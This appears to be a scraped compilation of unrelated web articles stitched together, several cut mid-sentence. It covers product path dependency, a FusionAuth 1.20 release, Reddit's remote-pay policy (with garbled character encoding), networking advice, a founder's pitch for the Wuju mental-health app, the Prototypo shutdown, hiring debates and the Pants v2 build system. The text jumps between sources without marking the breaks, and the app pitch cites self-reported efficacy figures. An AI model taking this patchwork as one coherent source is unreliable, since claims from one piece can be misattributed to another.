understand how and when you can change that path.</p><a href="#exploring-some-paths" id="exploring-some-paths"><h2>Exploring Some Paths</h2></a><p>Let's explore a few examples of Product Path Dependency at play...</p><a href="#smtp-protocol" id="smtp-protocol"><h3>SMTP Protocol</h3></a><p>Most email clients don't let you retract an email once it's been sent. You also can't edit a sent email. Most email clients — from Superhuman to HEY to Gmail — are built on the assumption that a sent email is a sent email. </p><p>Products have gotten creative to work around this assumption. Superhuman adds a 10 second wait period to allow you to unsend. If both sender and recipient are using Microsoft Exchange, an email can be "recalled". </p><p>But an <a href="https://tools.ietf.org/html/rfc821" rel="noopener" target="_blank">early decision in 1982</a> is largely still dictating how much of the world digitally communicates.  </p><p><img src="https://n2parko.com/api/asset?assetUrl=https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F902fe272-6f32-4432-8a0f-718df674cc53%2FUntitled.png&amp;blockId=96299059-f253-4b65-8d7c-138bfc19f900" alt="An image from Notion"></p><p>Slack is a great example of what can happen when new entrants aren't burdened by past decisions. Rather than using SMTP, slack uses Websockets. When you send a message, the recipients see the message almost immediately. And you can edit, delete, pin and share the messages you're sending. </p><p>Once you've used Slack, you wonder why email was so static and immutable. It revisited an assumption, and made it painfully visible. </p><a href="#instagram" id="instagram"><h3>Instagram</h3></a><p>There's been a lot of <a href="https://www.vox.com/recode/2020/8/5/21354975/tiktok-clone-instagram-reels-facebook-copycat" rel="noopener" target="_blank">shade</a> thrown at Instagram for attempting to clone hit features like Stories (Snapchat) and Reels (TikTok). Occasionally these clones will work, in the case of Stories, but most of the time they flop.

It is a badge of successfully building something that people want, and an organization that can support it. So if we can't avoid it, what can we do about it? </p><a href="#early-decisions-are-disproportionately-important" id="early-decisions-are-disproportionately-important"><h3>Early Decisions are <i>Disproportionately Important</i></h3></a><p>There is a paradox of early product decision-making. Early decisions are disproportionately important in that all future decisions will rely on it. Yet they are also the ones that need to be made the fastest and given the least consideration. "Try it out and see what sticks." Until it sticks, and then you are left with that decision for a very long time. </p><p>I think there's a way to resolve this tension by making decisions that <i>preserve future optionality</i>. It's somewhat of a hack to avoid making a decision that you will have to unwind in the future.  </p><p>Let's take a user data model as a simple example. When you have no users, designing your data model is easy. You can change on the fly. As you build more features — like your sign up flow — they are built around the assumptions you made in designing your user model. Are you going to collect birthday? Are you going to ask them to use a company email address? Can they invite friends? As you build upon these early product assumptions, they become harder and riskier to change. </p><p>Designing for optionality may take slightly more time, but thinking through some potential options you might want down the line can reduce your path dependence. </p><ul><li>Will Users be part of an Account?</li><li>Will Users need to be Linked via a social graph?</li><li>Will Users need to have multiple Plans?</li></ul><p><img src="https://n2parko.com/api/asset?assetUrl=https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fa558f675-6d7e-45a3-ade1-174780e3bb29%2FUntitled.png&amp;blockId=38c88d0c-697e-4319-ab5e-a7fd6f9d6881" alt="An image from Notion"></p><p>An option-preserving decision early on can save you months or years of migration work down the line. </p><a href="#competitors-are-forging-their-own-paths" id="competitors-are-forging-their-own-paths"><h3>Competitors are forging their own paths</h3></a><p>Competitors are on a path as well, but it's different from yours. By understanding your competitors path, you can understand what they might do in the future, and what they aren't able to do given their prior decisions. A company geared at large enterprises has likely built a sales team that will be reluctant  to lower prices to sell to startups. A company designed to run on-prem will have quarters/years to migrate to the cloud. </p><p>New entrants are unburdened by decisions of the the past and can move much faster in many more directions. Every so often, revisit the assumptions and "path" that you are on. If you were to start all over again, how might your product and the org look different? Migrations and re-writes can be painful, but better to do so early than to continue to building on a crumbling foundation. </p><a href="#pms-are-the-&quot;product-historians&quot;" id="pms-are-the-&quot;product-historians&quot;"><h3>PMs are the "Product Historians"</h3></a><p>PMs can play an important role in understanding the market, organizational, and technology constraints that of the past, that led to the product today. In doing so, you'll be able to revisit past assumptions, avoid making the same mistakes, and build the trust of your team and customers. It's easy to fall into the trap that those who came before made bad decisions. Rarely is that the case. They made the best decision they could with the data and assumptions they were working off of. </p><p>By putting yourself in the shoes of those that came before — and really understanding the context — you can make even better decisions going forward. </p></div></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            
              <p>We’re excited to announce the release of version 1.20. The 1.20 release shipped on Oct 26, 2020. This version delivers new features as well as resolving issues for users on version 1.19 and older.</p>

<!--more-->

<h2 id="highlights">Highlights</h2>

<p>In addition to bug fixes and user interface improvements, there are a couple of new features and improvements which deserve a spotlight.</p>

<h3 id="saml-saml-saml">SAML, SAML, SAML</h3>

<p>With this release, FusionAuth implements additional parts of the SAML 2.0 standard.</p>

<p>FusionAuth now has support for SAML POST bindings when it is acting as either the SP or the IdP. This allows FusionAuth to integrate with a number of popular commercial off-the-shelf applications and websites, including <a href="https://developers.login.gov/saml/">login.gov</a> and <a href="https://docs.alfresco.com/saml/concepts/saml-overview.html">Alfresco</a>.</p>

<p>FusionAuth also supports the <code>SessionIndex</code> attribute, which is optional, but required by some software applications, notably Artifactory.</p>

<p>Finally FusionAuth now honors the <code>AssertionConsumerServiceURL</code> in a SAML request. Multiple redirect URLs can be configured in the application SAML settings as well.</p>

<h3 id="docker-changes">Docker changes</h3>

<p>In this release, we updated the base image for Docker from <code>alpine</code> to <code>ubuntu:focal</code>. This should not impact functionality, but it’s worth paying attention to if you are building Docker images based on our image.</p>

<p>We made this change because in order to run on <code>alpine</code> without including the GNU C Library (<code>glibc</code>) we had to use a custom build of OpenJDK compiled using the <code>musl</code> C library. Due to some possible performance concerns with this option, we have moved to an official build of JDK provided by AdoptOpenJDK. This build is compiled using <code>glibc</code>. Unfortunately, using the <code>ubuntu:focal</code> image increased the docker image size by approximately 30 MB over the <code>alpine</code> based image. However, until we can obtain official builds from AdoptOpenJDK based upon the <code>musl</code> C library, we are not planning to ship an official FusionAuth image on <code>alpine</code> due to the performance concerns.</p>

<h3 id="additional-admin-user-management-forms">Additional admin user management forms</h3>

<p>In version 1.18, FusionAuth added <a href="https://fusionauth.io/features/advanced-registration-forms/">custom registration forms</a> for users with a paid edition.</p>

<p>In this release, we’ve added a few new forms. These customizations are also only available to customers with a paid edition. (Learn more about <a href="https://fusionauth.io/pricing/">purchasing a paid edition</a>.)</p>

<p>This new feature allows you to customize the form used to add or edit a user from the FusionAuth admin UI. These forms can be configured on a per tenant basis. For instance, you can now require a mobile phone number or require one or many custom fields when a FusionAuth admin is creating a user.</p>

<p>You can also modify the registration creation and update form in the FusionAuth admin UI, including capturing custom data, removing unused fields and adding validation to the custom fields. This form is configurable on an application by application basis.</p>

<p>For instance, if your business logic needs to know a user’s favorite color (or anything else), FusionAuth has you covered:</p>

<p><img src="https://fusionauth.io/assets/img/blogs/release-1-20/custom-edit-registration-form.png" alt="A customized registration editing form."></p>

<p>When combined with FusionAuth’s granular roles, which allow you to create users with limited privileges, you can expose these forms to customer service reps or other users whom you might not want to access the entire FusionAuth admin UI.</p>

<h2 id="bugs-squashed">Bugs squashed</h2>

<p>In addition to these features, there were over ten other bugs squashed and GitHub issues resolved as well. These fixes include changes to JWT contents in certain situations, dashboard user counts, and superfluous log messages. Please see the <a href="https://fusionauth.io/docs/v1/tech/release-notes/">release notes</a> for the full breakdown of the changes between 1.19 and 1.20.</p>

<p>If you’d like to upgrade your self-hosted FusionAuth instance, see our <a href="https://fusionauth.io/docs/v1/tech/installation-guide/upgrade/">upgrade guide</a>. If you have a FusionAuth Cloud deployment, open a <a href="https://account.fusionauth.io/" target="_blank">support request from your account dashboard</a> or <a href="https://fusionauth.io/contact" target="_blank">use our contact form</a> and we’ll get your servers upgraded! Or, if you’d like to download and use FusionAuth, <a href="https://fusionauth.io/pricing/">check out your options</a>.</p>

                                <div><p>Reddit will give employees, with some exceptions, the flexibility to work outside of offices going forward, the company said Tuesday in&nbsp;a blog post.</p>

<p>U.S. employees will now be paid the same, based on high-cost locations like NY or San Francisco, whether they work from those places or not.</p>

<p>â€œMoving forward, teams and team members will have flexibility to explore where they work: in the office, remotely, or a combination of the two,â€� the post said.</p>

<p>For those who do come into the office, the spaces will be look different: Reddit said itâ€™s â€œreimaginingâ€� its office space, without fixed desks and with â€œneighborhoodsâ€� for teams to work together. The newly flexible approach will help Reddit bring in top talent without concerns about relocations, increase workersâ€™ engagement and make their office space more efficient.</p>

<p>Several&nbsp;tech firms, including Facebook and Slack, have said during the pandemic that their workers are free to relocate and work remotely going forward, but they will be paid based on where they live. Stripe Inc. said that it would pay employees who relocate from the Bay Area or New York a one-time bonus of $20,000 â€“ but theyâ€™d also get a pay cut of as much as 10%. Brex, a fintech company based in San Francisco, has also outlined salary reductions for employees who move out of the Bay Area and New York to places like Austin, Texas or Utah.</p>

<p>â€œWe will not be afraid to continuously adapt and evolve our workforce philosophies, programs, and processes,â€� Redditâ€™s post stated.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <p>
I used to hate the term “networking”.
</p>
<p>
I remember walking home one day when I saw one of my friends rushing towards our career center. When I asked why he was in such a hurry, he mentioned there was a networking event going on. 
</p>
<p>
He carefully explained that your network is your net worth. I puked a bit in my mouth and continued home. 
</p>
<p>
It always seemed really artificial to me - you go to a place with the intention of meeting someone who’ll benefit your career, irrespective of your actual interest in getting to know them as a person. 
</p>
<p>
That doesn’t sit right with me. It leads to artificial and short sighted conversations. 
</p>
<p>
After thinking about it more, I realized that the reason I don’t like networking events is because the agenda is very unclear. 
</p>
<p>
And no, an opportunity to potentially meet someone who will help advance your career is not a clear agenda. I guess what I don’t like is that these events are trying really hard to manufacture serendipity. And no one likes a try-hard. 
</p>
<p>
But then you have something like developer meetups which I think are much better, mainly because the agenda is clear: you’re learning about something new. And you’re doing it together. 
</p>
<p>
Now, in the process of learning, you might indeed meet like minded people who help you advance in your career. But the point is that, this is not the primary purpose of the meetup - it’s just a byproduct. 
</p>
<h2>The best networking is learning</h2>


<p>
This got me thinking and then I realized that the best form of networking is learning. You either offer value by sharing your knowledge or by asking someone else a specific question about something they have experience with.
</p>
<p>
That’s why the best way to network is to write blog posts, reach out to people you admire with specific requests, and to use platforms like Twitter to find interesting content. 
</p>
<p>
This is the opposite of exchanging business cards and sending random Linkedin requests. 
</p>
<p>
This is networking done right - you have a clear agenda in mind and the focus is on giving value. Not like vague entrepreneurship conferences where the supposed goal is to end up with as many business cards as humanly possible. 
</p>
<p>
And to be clear, I don’t think the above has anything to do with being an extrovert or an introvert. 
</p>
<p>
Those two are just attitude types, not interpersonal skills, and more importantly, everyone has both sides. 
</p>
<p>
I consider myself an introvert but when I’m interested in a topic and I read something insightful about it, I’ve made it a habit to reach out to the author. 
</p>
<p>
Here are a few examples I’ve seen that embody the “best way of networking is learning” approach. 
</p>
<h2>Example #1: Learning in public</h2>

<p>
I follow <a href="https://twitter.com/stopachka/status/1318361464831442949">Stepan</a> on Twitter. He’s constantly posting his learnings and asking questions. Here’s an example:
</p>
  <center>
    <img src="https://www.careerfair.io/assets_enjoy_networking/stopa_tweet_1.png" alt="">
  </center>
<p>
Most of his tweets won’t get engagement, but sometimes people will comment and discuss topics he’s thinking about. 
</p>
  <center>
    <img src="https://www.careerfair.io/assets_enjoy_networking/stopa_tweet_2.png" alt="">
  </center>
<p>
Over time, when someone visits his profile, they can basically scroll through his timeline and discover what kind of topics he’s interested in. This is a fantastic way to meet like-minded people and develop a high quality network. 
</p>
<h2>Example #2: Blogging </h2>


<p>
I wanted to have a coffee chat with a founder. I reached out to him and he agreed. Instead of just speaking to him in private, I decided to make the <a href="https://www.careerfair.io/reviews/interview-with-ceo-of-appsumo">interview public</a> and wrote it up on my blog (with his permission, of course). 
</p>
  <center>
    <img src="https://www.careerfair.io/assets_enjoy_networking/ayman_screengrab.png" alt="">
  </center>
<p>
People who like the interview can now email me about it and we can talk about something that was discussed. A further benefit is that people can also reach out to Ayman (the CEO I spoke with). 
</p>
<p>
Extending this - people often email me about multiple topics I’ve discussed. All because I decided to publish online and share my thoughts. I’m still at the very early stages of this, but the benefits are already trickling in. 
</p>
<h2>Example #3: Publishing book notes </h2>


<p>
Nat Eliason publishes <a href="https://www.nateliason.com/notes">book notes</a> for almost everything he reads. Talking about books you both like is a great conversation starter. 
</p>
  <center>
    <img src="https://www.careerfair.io/assets_enjoy_networking/eliason_notes.png" alt="">
  </center>
<p>
Again, just like the Twitter example, people can get an overview of the kind of topics that Nat is interested in and reach out to him if they want to talk about something specific.
</p>
<p>
Reaching out to someone you admire or even just a peer works way better when you narrow the focus of conversation. For instance, instead of sending a 500 word email where you ramble your thoughts all over the place, you send 150 words directed at something you want to talk to about.
</p>
<p>
All of the above examples make it really easy to do this. 
</p>

Once you have created an account, make sure to create a new project and grab the API Key ID. We will be using your API Key ID later in part 2.</p><h2 id="part-2-webflow-setup">Part 2: Webflow Setup</h2><p>For this tutorial, we have created 3 pages: Blog Homepage, Sign In Page, and Blog Content Page. We will be using Webflow CMS to do this. Please <a href="https://www.youtube.com/watch?v=NBtF_XuimCo&amp;t=3720s">refer to this YouTube tutorial to create a simple blog</a>.</p><h3 id="blog-homepage-setup">Blog Homepage Setup </h3><p>The Blog Homepage contains a list of your blogs and an overview of each blog.

<p>I was first diagnosed with depression when I was working on a startup in 2007. I went to the doctor, told him I was feeling mild flu symptoms for a couple of months, he asked me a few questions, determined that I had depression, gave my some SSRIs, and sent me home.</p>



<p>It worked for a while, but then 2008 happened, our startup collapsed, the stakes got higher and the depression came back. I tried different meds for a few years and every time life took a bad turn the doc recommended I up the dosage. I could see this how  would eventually lead me to a straitjacket and started looking for other ways.</p>



<p>Over the years I tried various forms of therapy, studied and actively practiced life coaching, got married, had kids, moved to another country and changed everything I could think of about my life. Unfortunately the dark bouts of depression remained.</p>



<p>About four years ago I stumbled on a book called Highly Sensitive Person that absolutely blew my mind. I realized I had very intense emotions that I was culturally programmed to repress, which caused my psyche to overload and go into full apathy mode also known as depression.</p>



<p>I’ve been on a path to figure out how to process my emotions without repressing them and combined my personal experience with several non-mainstream techniques to build Wuju. It’s an online app that can help you tap into your hidden emotions and release them so they no longer influence your behaviour or cause depressive symptoms.</p>



<p>I’ve used it in the last 18 months to deal with parenting two kids, surviving infidelity, losing my job, starting a business, and managing covid anxiety. My longest bout of depression now lasts a couple of hours at most, and even that is pretty rare. Others have used the app to deal with loneliness, social media and porn addiction and a general sense of being stuck in a rut.</p>



<p>I can’t make any bold claims yet, but the <a href="https://twitter.com/finereli/status/1314784540703899648?s=20">stats I have from close to 1,000 people</a> show that a single use of the app causes apathy, tension and fear to drop by about 70% and anger by almost 90%.</p>



<p>You can try it too: <a href="https://wuju.app/">wuju.app</a></p>



<hr>



<p>You can try the app for free but full use is subscription based. If you need it but can’t afford it please ping me and we’ll figure something out.</p>



<p>Your mental health is your responsibility and this is an experimental tool that may or may not work for you.</p>

                <p>This article could have been entitled&nbsp;337,737,600 seconds, but hiding the fact that Prototypo started more than 10 years ago would have been a missed opportunity to show the dedication the team and I, as a founder, put in this project over the years.</p>
<p>Prototypo started as a student project when I studied Graphic Design at H.E.A.R Strasbourg in France. As a non-savvy Type Designer I was frustrated to not be able to complete the typeface projects I had in mind. Typefaces are made of rules and systems, right? Catcha! We can code something that follows rules, so we should succeed in coding fonts. That was the starting point of the next 10 years, and the beginning of the Roller Coaster, a.k.a creating a startup company.</p>
<p>Prototypo is a startup like many others: before having a stable and reliable business model, we put a lot of energy into developing innovative and useful technologies for our users.</p>
<p>But before being a startup, Prototypo is a company. Today we have reached the end of our resources without having found the expected Product Market Fit, and so the Break-even.</p>
<p>After several years of a strong dedication and passion for what we’ve built, we decided to shutdown the company.</p>
<p>Since the first second, I knew that it would be a hard journey with many obstacles on the path. But I regret nothing. The next 337,737,599 seconds were full of great experiences, shared with amazing people.</p>
<p>Thank you for those who supported us along the road, it was a great adventure.</p>

<p>Another day, another HackerNews discussion about hiring being broken. The most recent one I saw was triggered by <a href="https://blog.alinelerner.com/ive-been-an-engineer-and-a-recruiter-hiring-is-broken-heres-why-and-heres-what-it-should-be-like-instead/">a blog post</a> by the formidable Aline Lerner (disclaimer: Aline is a friend and we collaborated on a <a href="https://www.holloway.com/g/technical-recruiting-hiring/about">hiring book</a> last year). Now, I 100% agree that hiring is broken, and Aline’s post is really thoughtful. In fact, a lot of “hiring is broken” articles are thoughtful.</p>



<p>But the discussion threads are something else—they miss the point of the article. The discussion threads are even more broken than hiring. And they’re really repetitive. They always do contain grains of truth, but inevitably have us reaching conclusions that are simplistic, and in my opinion, create a pretty bad attitude in the tech industry.</p>



<p><strong>Conclusion #1: “Hiring sucks for candidates, but hiring managers can do what they want</strong>“</p>



<p>The truth is that hiring is hard for everyone. There’s no question about it. It’s hard for both candidates and for hiring managers. Sure, FAANGs and the startup-du-jour might have a leg up, but most people who are hiring are trying to hire at a non-FAANG, non-sexy company. If you’ve never done it, you should try it at some point in your career. It’s an <em>incredibly </em>humbling experience. Or, at the very least, find a friend who’s spent time on hiring, and ask them for their favorite battle story. They’ve been ghosted by candidates. They’ve spent hours trying to convince people to talk to them. They’ve spent even more time getting candidates to the offer stage, only to lose out to the FAANG / startup-du-jour.</p>



<p>And yes, on the balance, power and information asymmetry work out in favor of the companies hiring. And that asymmetry is much larger with FAANGs. But even FAANGs have to invest a tremendous amount of time and energy into hiring. It’s not really easy for anyone. </p>



<p>Especially if you want to do it <em>well</em>. Ask any successful leader (entrepreneur, manager) what they spend most of their time on, and it’ll either involve a large chunk spent on hiring (if they appreciate the problem and give it the attention it deserves) or dealing with the consequences of bad hiring (if they don’t).</p>



<p><strong>Conclusion #2: “Hiring is a crap-shoot—it’s a roll of the dice</strong>“</p>



<p>I strongly disagree with this one. When writing the <a href="https://www.holloway.com/g/technical-recruiting-hiring">Holloway Guide to Technical Hiring and Recruiting</a>, I got to interview dozens of really thoughtful hiring managers and recruiters. They were really good at their jobs. And there were some common themes. They were thoughtful about every step of their process. They kept their process balanced and fair, holding a high bar but respecting candidates and their time. They didn’t chase the same pool of candidates everyone else was chasing—instead, they found non-traditional ways to discover really talented and motivated people who weren’t in the pool of usual suspects. They were thoughtful about what signals they were looking for and how best to assess them. And, they deeply understood their team’s needs, and candidates’ needs, and were really good at deciding when there was or wasn’t a fit. But most of all, they were effective: they built really talented teams.</p>



<p>There are a handful of companies that have built amazing hiring engines, and the proof is that they’ve been able to put together really strong teams. You can generally tell that if a person worked at a certain company at a certain time, that person is probably incredibly intelligent and incredibly motivated (some examples are Google, Facebook, Stripe, Dropbox at different points in time). There will always be noise. Even the best hiring managers will sometimes make hiring mistakes. And of course, even the best engineers may not be a fit for every role or every company. </p>



<p>Again, hiring is hard. But there is not a shred of doubt in my mind that if you are thoughtful about it, you can hire well. And really, you don’t need to be perfect at it. You just need to be better than the rest.</p>



<p><strong>Conclusion #3: “FAANGs suck at hiring”</strong></p>



<p>This one has some truth to it, but it’s a lot more subtle than “FAANGs suck at hiring”. Because let’s face it, they do hire really smart people. Some of the smartest people I know are at FAANGs right now. So let’s decouple that statement a little more.</p>



<p>FAANGs <em>do </em>suck at parts of hiring, like their candidate experience. They can be really slow at making hiring decisions. Their hiring process might be tedious and seem arbitrary. But <em>they usually can get away with it</em>, <em>and you probably can’t!</em> They’ve got a strong brand, interesting technical challenges (interesting for some people, at least), and a lot of money. In fact, one FAANG VP of Engineering told me: “our process is what we can get away with”. To the point that they can even play it off as a positive: “our process is slow and long because we are <em>very</em> selective”.</p>



<p>And look, I’m sure FAANGs lose some talented candidates who get turned off by their “you’d-be-blessed-to-work-with-us” attitude. They definitely have a lot of room for improvement. But at the end of the day, they’re operating a process that’s delivering large quantities of really smart people at scale. In fact, I’d argue their internal processes around strategy, performance management / promotions, etc cause incredibly <em>more</em> damage to them than broken hiring—if you lose out on hiring one talented person when you have thousands applying to work for you, that’s one story, but if you hire someone really talented and driven, and they work for you for 6 to 12 months but don’t meet their potential and leave in bitter frustration… well, that’s a subject for another post)</p>



<p>“But”, people go on, “FAANGs <em>also</em> don’t know how to interview!” Which brings me to trope #4.</p>



<p><strong>Conclusion #4: “Whiteboard</strong> <strong>and algo/coding interviews suck”</strong></p>



<p>Again, this one has some truth to it, but if you just stop at the above statement, you miss the point.</p>



<p>Algo/coding interviews are one of the primary hiring mechanisms used by FAANG companies. And they are incredibly unpopular—at least in discussion threads. But big companies have spent years looking at their hiring data and feeding that back into their hiring process (coining the term “<a href="https://rework.withgoogle.com/subjects/people-analytics/">people analytics</a>” along the way).</p>



<p>The argument against them is usually a combination of:</p>



<ul><li>they really only assess pattern-matching skills (map a problem to something you’ve seen before)</li><li>they only assess willingness to spend time preparing for these types of interviews</li></ul>



<p>These are fair criticisms, but that doesn’t mean these interviews are actually terrible. I mean, they might be terrible for you if you’re interviewing and you don’t get the job. You’re probably a brilliant engineer, and I agree, these interviews certainly don’t fully assess your ability (or maybe you’re a shit engineer, I don’t know you personally). In any case, the leap from “this interview sucked for me” to “this interview sucks” is still pretty big.</p>



<p>If you’re a large tech co with a big brand and a salary scale that ranks at the top of&nbsp;<a href="https://www.levels.fyi/">Levels.fyi</a>, you probably get a lot of applications. So a good interview process is one that weeds out people who wouldn’t do well at your company. To do well at a large tech company, you need to (and I’m painting with a really broad brush, but this is true for 90% of roles at these companies):</p>



<ol><li>Some sort of problem-solving skill that’s a mix of raw intelligence and/or ability to solve problems by pattern-matching to things you’ve seen before.</li><li>Ability/commitment to work on something that may not&nbsp;<em>always&nbsp;</em>be that intrinsically motivating, in the context of getting/maintaining a well-paying job at a large, known company.</li></ol>



<p>Hopefully you can see where I’m going with this. Basically, the very criticisms thrown at these types of interviews are the reason they work well for these companies. They’re a good proxy for the work you’d be doing there and how willing you are to do it. If you’re good at pattern matching, and are willing to invest effort into practicing to get one of these jobs, you’ll probably do well at the job.</p>



<p>Not that there’s anything wrong with that type of work. I spent several years at big tech co’s, and the work was intellectually stimulating most of the time. But a lot of times it wasn’t. It was a lot of pattern-matching. Looking at how someone else had solved a problem in a different part of the code-base, and adapting that to my use-case.</p>



<p>On the other hand, if you’re an engineer (no matter how brilliant) who struggles with being told what to do or doing work that you can’t immediately connect to something intrinsically motivating to you, that FAANG interview just did both you and the company a favor by weeding you out of the process.</p>



<p>So the truth is, there is no single “best interview technique”. In our book, we wrote several chapters about different interviewing techniques and their pros and cons. In-person algo/coding interviews on a whiteboard, in-person interviews where you work in an existing code base, <a href="https://www.holloway.com/g/technical-recruiting-hiring/sections/take-homes">take-home interviews</a>, pairing together, having a trial period, etc all have pros and cons. The trick is finding a technique that works for both the company and the candidate. </p>



<p>And that can really differ from company to company and candidate to candidate. A VP at Netflix told me about how they had a really strong candidate come in, but when asked to do a whiteboard-type interview, informed them (politely) that they might as well just reject him then. He was no good at whiteboard interviews… But if they allowed him to go home and write some code, he’d be happy to talk through it. And since then, many Netflix teams have offered candidates the choice of doing a take home.</p>



<p>And really, any interview format can suck. It can fail to assess a candidate for the things a company needs and it can be a negative candidate experience. Which would you rather have:</p>



<ul><li>A whiteboard interview with heavy algorithms for a role where that knowledge (or ability to develop that knowledge) isn’t critical, delivered by an apathetic engineer who doesn’t care about their job.</li><li>A …</li></ul></div></article></main></section></div></div>

				<h3 id="pants-2-0-0-the-first-stable-release-of-the-pants-v2-open-source-build-system-is-out-now-">Pants 2.0.0, the first stable release of the Pants v2 open-source build system, is out now!</h3><p>There are so many tools in the Python development ecosystem. You might use <a href="https://pip.pypa.io/en/stable/">pip</a> to resolve dependencies, <a href="https://docs.pytest.org/en/stable/">pytest</a> to run tests, <a href="https://flake8.pycqa.org/en/latest/">flake8</a> and <a href="https://www.pylint.org/">pylint</a> for lint checks, <a href="https://black.readthedocs.io/en/stable/">black</a> and <a href="https://pycqa.github.io/isort/">isort</a> for auto-formatting, <a href="http://mypy-lang.org/">mypy</a> for type checking, <a href="https://ipython.org/">IPython</a> or <a href="https://jupyter.org/">Jupyter</a> for interactive sessions, <a href="https://setuptools.readthedocs.io/en/latest/">setuptools</a>, <a href="https://pex.readthedocs.io/en/latest/">pex</a> or <a href="https://www.docker.com/">docker</a> for packaging, <a href="https://developers.google.com/protocol-buffers">protocol buffers</a> for code generation, and many more. Not to mention any custom tooling you've built for your repo. </p><p>Installing, configuring and orchestrating the invocation of these tools<strong>—</strong>all while not re-executing work unnecessarily<strong>—</strong>is a hard problem, especially as your codebase grows. The lack of a robust, scalable build system for Python has been a problem for a long time, and this has become even more acute in recent years, with Python codebases increasing in size and complexity. </p><p>Fortunately, there is now a tailor-made (pun intended) solution: <strong>Pants v2</strong>!</p><p><a href="https://www.pantsbuild.org/">Pants v2</a> is designed from the ground-up for fast, consistent builds. Some noteworthy features include:</p><ul><li>Minimal metadata and boilerplate</li><li>Fine-grained workflow</li><li>Shared result caching</li><li>Concurrent execution</li><li>A responsive, scalable UI</li><li>Unified interface for multiple tools and languages</li><li>Extensibility and customizability via a plugin API</li></ul><figure><img src="https://blog.pantsbuild.org/content/images/2020/10/render1603750306032.gif" alt=""><figcaption>Pants running multiple linters in parallel</figcaption></figure><p>Read on to learn more about Pants v2, and what it means for your Python codebase.</p><hr><h2 id="a-little-history">A little history</h2><p>We started the original open-source Pants project back in 2011. At the time, we were frustrated by slow, flaky Scala builds. The leading strategy for scaling was to hand each developer a RAM stick and a screwdriver... Surely this was a problem we could tackle with software! Thus Pants v1 was born. </p><p>Pants v1 was quite successful, and was adopted at cutting-edge tech companies such as Twitter, Foursquare, Square and others. But we still weren't satisfied: The APIs were clunkier than we would have liked, the UI was overly chatty, caching was hard to get right, and concurrent execution had to be special-cased. We knew there were plenty of performance and stability improvements to be had, if we could only unlock them. </p><p>We learned a lot from our years of work on Pants v1, and knew that we could design something new and better, leaning on our experience with v1 while addressing the drawbacks of that system. Luckily, at the same time as we began thinking about this hypothetical next system, a new motivating problem emerged: Python builds.</p><h2 id="python-builds-today">Python builds today</h2><p>As you probably know, Python has skyrocketed in popularity in recent years. Not only is it used to build a wide variety of server applications, via frameworks such as <a href="https://www.djangoproject.com/">Django</a> and <a href="https://flask.palletsprojects.com/en/1.1.x/">Flask</a>, but it's also the language of choice for data scientists, thanks to powerful libraries and tools such as <a href="https://numpy.org/">NumPy</a>, <a href="https://www.scipy.org/">SciPy</a>, <a href="https://pandas.pydata.org/">Pandas</a> and <a href="https://jupyter.org/">Jupyter</a>. </p><p>Python hits a sweet spot of simplicity and power, but there is a big problem - there is no truly great scalable build tool for Python, and this is becoming a real pain point as Python repos grow like never before. &nbsp;</p><p>Python builds today involve manually invoking a wide variety of tools. Each tool has to be installed, configured and invoked in just the right way, often while sequencing the output of one tool into input of another. Knowing how to use each tool in a given scenario is complicated and burdensome. </p><p>Sure, you can hack around the problem for a while with some combination of shell scripts, <a href="https://www.gnu.org/software/make/manual/make.html">Makefiles</a>, <a href="https://tox.readthedocs.io/en/latest/">tox</a>, and <a href="https://python-poetry.org/">poetry</a>. But even a small code change might require you to run a huge amount of sequential build work. Re-executing the same processes with the same inputs over and over again is a frustrating waste of time and resources. &nbsp;And these solutions start to break down as your codebase grows.</p><p>Perhaps you experimented with more complex build systems, such as <a href="https://bazel.build/">Bazel</a> or <a href="https://v1.pantsbuild.org/">Pants v1</a>. &nbsp;But it's laborious to maintain all that BUILD metadata, all for a sub-par experience not optimized for Python. Not to mention the difficulty of implementing your own custom build logic. </p><p>Alternatively, maybe you've been tempted to split up your codebase into multiple interdependent repos, each with their own "smaller" builds. But that creates an even thornier problem, namely how to manage those interdependencies. Having to propagate changes across codebase boundaries can slow development down to a crawl, and leave you with the worst of both worlds - slower processes and a fragmented, unmanageable codebase.</p><p>A great build system for repos - of all sizes - that include Python code would support fine-grained invalidation and caching, so that it only executes the build work actually affected by a change. It would support concurrent local and even remote execution, to greatly speed up work by using all available CPU. It would be easy to adopt in a small repo, but would scale up as your codebase grows. It wouldn't require huge amounts of boilerplate metadata, and it would be easy to extend with custom build logic. </p><p>Well, Pants v2 is that system! </p><h2 id="introducing-pants-v2">Introducing Pants v2</h2><p><a href="https://www.pantsbuild.org/">Pants v2</a> is a completely new open-source build system, inspired by our work on Pants v1. &nbsp;We've been developing and testing it for the last couple of years, and it's finally ready for prime time!</p><p>A key factor in the design of Pants v2 was a set of lessons we learned from Pants v1 and other existing systems, such as Bazel. Among them: that ease of use and performance matter, boilerplate is annoying, concurrency and caching require hard design work, and most people will need custom logic at some point.</p><h3 id="lesson-1-ease-of-use-and-performance-both-matter">Lesson #1: Ease of use and performance both matter</h3><p>When designing software you often find yourself making tradeoffs between ease of use and performance. But in a build system, both are vital. The Pants v2 execution engine - which is the performance-critical heart of the system - is written in <a href="https://www.rust-lang.org/">Rust</a>, for raw speed. And the domain-specific build logic is written in familiar, easy to work with, type-annotated Python 3. This helps make Pants v2 easy to extend, without compromising performance. </p><p>Pants v2 also runs a daemon that memoizes fine-grained build state in memory, for even faster performance. This daemon watches for changes to your source files and precisely invalidates its state on the fly to ensure that the minimum amount of work happens the next time you build.</p><h3 id="lesson-2-writing-build-metadata-is-a-real-drag">Lesson #2: Writing build metadata is a real drag</h3><p>Some build tools are slow because they don't have enough information about the structure of your code to intelligently perform incremental work. Others have gone too far in the other direction, requiring a huge amount of metadata and boilerplate in BUILD files, especially relating to your code's dependencies. </p><p>Pants v2 offers the best of both worlds - intelligent, fine-grained incremental work, without the boilerplate. It does so by assuming sensible, magic-free defaults, inferring dependencies from the import statements in your code, and supporting plugins for custom inference logic. Stay tuned for an upcoming post on exactly how Pants achieves this!</p><h3 id="lesson-3-design-for-caching-concurrency-and-remoting">Lesson #3: Design for caching, concurrency and remoting </h3><p>Writing build logic that can be cached and executed concurrently and remotely is very hard. You have to be very careful about not producing or consuming side-effects, and it's extremely difficult to tack that on later. And unless you design your APIs with care, supporting these kinds of features often places severe restrictions on what your build logic may safely do. </p><p>In Pants v2, build logic is composed of <a 